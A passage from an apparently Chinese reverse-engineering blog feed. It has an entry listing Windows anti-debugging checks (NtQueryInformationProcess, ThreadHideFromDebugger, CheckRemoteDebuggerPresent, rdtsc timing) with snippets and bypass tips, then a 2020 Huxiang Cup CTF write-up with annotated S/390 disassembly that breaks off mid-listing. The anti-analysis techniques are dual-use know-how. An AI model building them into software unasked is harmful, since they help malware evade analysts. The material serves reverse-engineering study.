    <content type="html"><![CDATA[<p>今后遇到的反调试都记录在此，有些具体内部原理后面再来补。<a id="more"></a></p><h3 id="NtQueryInformationProcess函数"><a href="#NtQueryInformationProcess函数" class="headerlink" title="NtQueryInformationProcess函数"></a>NtQueryInformationProcess函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *NtQueryInformationProcessPtr)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       HANDLE processHandle,<span class="comment">//进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PROCESSINFOCLASS processInformationClass,<span class="comment">//信息类型</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PVOID processInformation,<span class="comment">//缓冲区，函数返回值存入的地址空间。</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       ULONG processInformationLength,<span class="comment">//缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PULONG returnLength)</span></span>;</span><br><span class="line"><span class="comment">//当第二个参数为7时可以用来查看进程的调试端口。当进程被调试时返回-1，否则返回其它值。</span></span><br></pre></td></tr></table></figure><p>另外由于这是一个未公开的API，所以我们需要使用LoadLibrary和GetProceAddress的方法获取调用地址。这里贴上遇到的程序中使用这个函数来检测调试的实例：</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105170711386.png" alt="image-20201105170711386"></p><p>所以执行完这个函数，可以根据dword_404468的值判断进程是否处于调试。</p><h3 id="NtSetInformationThread函数"><a href="#NtSetInformationThread函数" class="headerlink" title="NtSetInformationThread函数"></a>NtSetInformationThread函数</h3><p>与上面一个函数类似的用法，也需要使用LoadLibrary和GetProceAddress的方法获取调用地址。</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105171431630.png" alt="image-20201105171431630"></p><p>调用这个函数时，如果在第二个参数里指定0x11这个值（意思是ThreadHideFromDebugger），等于告诉操作系统，将所有附加的调试器统统取消掉，即退出调试状态。</p><h3 id="IsProcessorFeaturePresent函数"><a href="#IsProcessorFeaturePresent函数" class="headerlink" title="IsProcessorFeaturePresent函数"></a>IsProcessorFeaturePresent函数</h3><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105172140986.png" alt="image-20201105172140986"></p><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>CheckRemoteDebuggerPresent实际上调用了ntdll里面的ZwQueryInformationProcess来检测，和上面记录的第一个函数一样，其第二个参数是7，被定义为ProcessDebugPort。</p><p>它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    BOOL ret;  </span><br><span class="line">    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">    <span class="keyword">return</span> ret;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果有调试器存在则ret的值为非0</span></span><br></pre></td></tr></table></figure><h3 id="时钟检测（rdtsc）"><a href="#时钟检测（rdtsc）" class="headerlink" title="时钟检测（rdtsc）"></a>时钟检测（rdtsc）</h3><p>这个反调试主要就是检查2个指令执行之间相差的时间，如果我们调试单步执行的时间肯定是大于正常时间的。</p><p>对抗这种反调试，可以打patch，也可以把断点下在它后面，具体还是情况而定。</p><p>一个实例，通过在它后面下断对抗。</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201213172904993.png" alt="image-20201213172904993"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今后遇到的反调试都记录在此，有些具体内部原理后面再来补。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>2020湖湘杯</title>
    <link href="https://www.bxnop.cn/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
    <id>https://www.bxnop.cn/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/</id>
    <published>2020-11-02T00:37:57.000Z</published>
    <updated>2020-11-05T08:45:51.083Z</updated>
    
    <content type="html"><![CDATA[<p>总的来说这次的re都还好。<a id="more"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h3><p>一个不太常见架构<strong>S/390</strong>的程序，ida后发现不能反汇编，报错。。</p><p>然后在linux下使用qemu来模拟了程序的运行，确定关键字符串：<strong>Please input your string:</strong></p><p>在所给的hex.txt搜索该字符串定位关键字符串的地址，再到dis.txt文件中搜索该地址定位到关键汇编指令地址处。</p><p>接着使用qemu在gdb一个端口进行下断调试验证一下：</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/image-20201102131400699.png" alt></p><p>剩下就是查看文档<a href="http://www.tachyonsoft.com/inst390m.htm" target="_blank" rel="noopener">z Architecture汇编手册</a>来手撸汇编代码。最后整理关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1000910</span>:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)  <span class="comment">//第一个关键函数</span></span><br><span class="line"><span class="number">1000916</span>:e3 f0 ff <span class="number">50</span> ff <span class="number">71</span> lay%r15,<span class="number">-176</span>(%r15)  <span class="comment">//lea</span></span><br><span class="line"><span class="number">100091</span>c:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000920</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)    <span class="comment">//r2 = r11+160  input</span></span><br><span class="line"><span class="number">1000926</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">04</span> lg%r2,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100092</span>c:c0 e5 ff ff ff <span class="number">02</span> brasl%r14,<span class="number">0x1000730</span></span><br><span class="line"><span class="number">1000932</span>:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2 <span class="comment">//mov</span></span><br><span class="line"><span class="number">1000936</span>:a7 <span class="number">1f</span> <span class="number">00</span> <span class="number">20</span>       cghi%r1,<span class="number">32</span>   <span class="comment">//cmp len(input), 32</span></span><br><span class="line"><span class="number">100093</span>a:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">06</span>       je<span class="number">0x1000946</span></span><br><span class="line"><span class="number">100093</span>e:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">1000942</span>:a7 f4 <span class="number">00</span> <span class="number">56</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">1000946</span>:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">100094</span>c:a7 f4 <span class="number">00</span> <span class="number">49</span>       j<span class="number">0x10009de</span></span><br><span class="line"><span class="number">1000950</span>:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000956</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100095</span>c:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000960</span>:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000964</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2f</span> clfi%r1,<span class="number">47</span></span><br><span class="line"><span class="number">100096</span>a:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x100098c</span></span><br><span class="line"><span class="number">100096</span>e:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000974</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100097</span>a:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100097</span>e:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000982</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">39</span> clfi%r1,<span class="number">57</span></span><br><span class="line"><span class="number">1000988</span>:a7 c4 <span class="number">00</span> <span class="number">24</span>       jle<span class="number">0x10009d0</span></span><br><span class="line"><span class="number">100098</span>c:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000992</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">1000998</span>:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100099</span>c:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009</span>a0:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">60</span> clfi%r1,<span class="number">96</span></span><br><span class="line"><span class="number">10009</span>a6:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x10009c8</span></span><br><span class="line"><span class="number">10009</span>aa:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>0:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>6:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">10009b</span>a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009b</span>e:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">66</span> clfi%r1,<span class="number">102</span></span><br><span class="line"><span class="number">10009</span>c4:a7 c4 <span class="number">00</span> <span class="number">09</span>       jle<span class="number">0x10009d6</span></span><br><span class="line"><span class="number">10009</span>c8:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">10009</span>cc:a7 f4 <span class="number">00</span> <span class="number">11</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">10009</span>d0:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d2:a7 f4 <span class="number">00</span> <span class="number">03</span>       j<span class="number">0x10009d8</span></span><br><span class="line"><span class="number">10009</span>d6:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d8:eb <span class="number">01</span> b0 ac <span class="number">00</span> <span class="number">6</span>a asi<span class="number">172</span>(%r11),<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>de:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009e2</span>:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">10009e6</span>:a7 c4 ff b5       jle<span class="number">0x1000950</span></span><br><span class="line"><span class="number">10009</span>ea:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">01</span>       lhi%r1,<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>ee:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">10009f</span>2:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">10009f</span>6:e3 <span class="number">40</span> b1 <span class="number">20</span> <span class="number">00</span> <span class="number">04</span> lg%r4,<span class="number">288</span>(%r11)</span><br><span class="line"><span class="number">10009f</span>c:eb bf b1 <span class="number">08</span> <span class="number">00</span> <span class="number">04</span> lmg%r11,%r15,<span class="number">264</span>(%r11)</span><br><span class="line"><span class="number">1000</span>a02:<span class="number">07</span> f4             br%r4</span><br><span class="line"><span class="number">1000</span>a04:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a06:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a08:b3 c1 <span class="number">00</span> <span class="number">2b</span>       ldgr%f2,%r11  <span class="comment">//加密判断函数</span></span><br><span class="line"><span class="number">1000</span>a0c:b3 c1 <span class="number">00</span> <span class="number">0f</span>       ldgr%f0,%r15</span><br><span class="line"><span class="number">1000</span>a10:e3 f0 ff <span class="number">48</span> ff <span class="number">71</span> lay%r15,<span class="number">-184</span>(%r15)</span><br><span class="line"><span class="number">1000</span>a16:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000</span>a1a:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)        <span class="comment">//input</span></span><br><span class="line"><span class="number">1000</span>a20:e5 <span class="number">4</span>c b0 a8 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">168</span>(%r11),<span class="number">0</span> <span class="comment">//mov 立即数</span></span><br><span class="line"><span class="number">1000</span>a26:a7 f4 <span class="number">00</span> <span class="number">4b</span>       j<span class="number">0x1000abc</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a2a:e3 <span class="number">10</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">168</span>(%r11)  <span class="comment">//循环</span></span><br><span class="line"><span class="number">1000</span>a30:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)<span class="comment">//r1 = input[i]</span></span><br><span class="line"><span class="number">1000</span>a36:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000</span>a3a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000</span>a3e:<span class="number">50</span> <span class="number">10</span> b0 b4       st%r1,<span class="number">180</span>(%r11)<span class="comment">//r11[180] = r1</span></span><br><span class="line"><span class="number">1000</span>a42:<span class="number">58</span> <span class="number">30</span> b0 b4       l%r3,<span class="number">180</span>(%r11) <span class="comment">//r3 = r1</span></span><br><span class="line"><span class="number">1000</span>a46:<span class="number">71</span> <span class="number">30</span> b0 b4       ms%r3,<span class="number">180</span>(%r11)<span class="comment">//r3*r3</span></span><br><span class="line"><span class="number">1000</span>a4a:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 ef larl%r1,<span class="number">0x109b228</span><span class="comment">//</span></span><br><span class="line"><span class="number">1000</span>a50:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)   <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a56:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2  (*4)</span></span><br><span class="line"><span class="number">1000</span>a5c:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">// 0x109b228[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>a60:b2 <span class="number">52</span> <span class="number">00</span> <span class="number">31</span>       msr%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a64:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 e2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a6a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a70:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">20</span>       aghi%r2,<span class="number">32</span><span class="comment">//add + 32</span></span><br><span class="line"><span class="number">1000</span>a74:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a7a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a7e:<span class="number">71</span> <span class="number">10</span> b0 b4       ms%r1,<span class="number">180</span>(%r11)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"><span class="number">1000</span>a82:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a84:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 d2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a8a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a90:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">40</span>       aghi%r2,<span class="number">64</span><span class="comment">//i+64</span></span><br><span class="line"><span class="number">1000</span>a94:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//(i+64) &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a9a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//r1 = 0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"><span class="number">1000</span>a9e:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//add r3 +  0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>aa0:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">68</span> lgrl%r1,<span class="number">0x109b170</span></span><br><span class="line"><span class="number">1000</span>aa6:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)  <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>aac:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>ab2:<span class="number">50</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       st%r3,<span class="number">0</span>(%r2,%r1)r1[r2] = r3, <span class="number">0x109dd08</span></span><br><span class="line"><span class="number">1000</span>ab6:eb <span class="number">01</span> b0 a8 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">168</span>(%r11),<span class="number">1</span> <span class="comment">//i++;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>abc:<span class="number">58</span> <span class="number">10</span> b0 a8       l%r1,<span class="number">168</span>(%r11)<span class="comment">//mov eax, i(168(%r11));</span></span><br><span class="line"><span class="number">1000</span>ac0:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">1000</span>ac4:a7 c4 ff b3       jle<span class="number">0x1000a2a</span>   <span class="comment">//cmp </span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ac8:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">01</span> mvhi<span class="number">172</span>(%r11),<span class="number">1</span> <span class="comment">//j = 1</span></span><br><span class="line"><span class="number">1000</span>ace:e5 <span class="number">4</span>c b0 b0 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">176</span>(%r11),<span class="number">0</span><span class="comment">//i = 0</span></span><br><span class="line"><span class="number">1000</span>ad4:a7 f4 <span class="number">00</span> <span class="number">21</span>       j<span class="number">0x1000b16</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ad8:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">4</span>c lgrl%r1,<span class="number">0x109b170</span>  <span class="comment">//判断循环  加密后的数据</span></span><br><span class="line"><span class="number">1000</span>ade:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>ae4:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>aea:<span class="number">58</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       l%r3,<span class="number">0</span>(%r2,%r1)<span class="comment">//enc[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>aee:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">5</span>d larl%r1,<span class="number">0x109b1a8</span></span><br><span class="line"><span class="number">1000</span>af4:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>afa:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000b</span>00:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//d[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000b</span>04:<span class="number">19</span> <span class="number">31</span>             cr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>06:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">05</span>       je<span class="number">0x1000b10</span></span><br><span class="line"><span class="number">1000b</span>0a:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">1000b</span>10:eb <span class="number">01</span> b0 b0 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">176</span>(%r11),<span class="number">1</span> <span class="comment">//add</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>16:<span class="number">58</span> <span class="number">10</span> b0 b0       l%r1,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000b</span>1a:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span><span class="comment">//cmp</span></span><br><span class="line"><span class="number">1000b</span>1e:a7 c4 ff dd       jle<span class="number">0x1000ad8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>22:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000b</span>26:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>2a:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>2e:b3 cd <span class="number">00</span> b2       lgdr%r11,%f2</span><br><span class="line"><span class="number">1000b</span>32:b3 cd <span class="number">00</span> f0       lgdr%r15,%f0</span><br><span class="line"><span class="number">1000b</span>36:<span class="number">07</span> fe             br%r14</span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>38:eb bf f0 